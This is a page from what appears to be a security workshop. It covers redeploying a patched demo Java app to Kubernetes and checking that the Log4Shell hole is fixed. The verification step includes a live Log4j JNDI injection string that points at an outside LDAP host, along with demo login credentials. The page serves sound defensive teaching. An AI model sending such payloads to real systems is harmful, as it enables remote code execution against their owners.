+++
title = "Step 9: Verify the Vulnerability is no longer exploitable."
chapter = false
weight = 44
+++

## Update your VS Code Server working branch

Back in VS Code Server, pull the latest changes, including the Snyk Fix, to the working environment.

```sh
git pull
```

## Re-build the Image
Now build and push the container to ECR (make sure you are inside the todolist directory).

```sh
docker build -t $REPO/todolist:latest .
docker push $REPO/todolist:latest
```

## Re-deploy the Application to EKS

After pushing the image to ECR, push it to EKS by scaling the goof deployment with kubectl. The deployment's ImagePullPolicy forces EKS to pull the latest image from ECR.

```sh
kubectl scale deployment todolist --replicas=0
kubectl scale deployment todolist --replicas=1
```

## Verify the Exploit no longer works

Refresh your browser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string:

* User:
```bash
foo@bar.org
```
* Password:
```bash
foobar
```
Enter search string
```bash
${jndi:ldap://ldap.darkweb:80/#Vandalize}
```

The page will not show the graffiti because the newer version on Log4J no longer is vulnerable!

![todolist-fixed](/images/todolist-fixed.png)
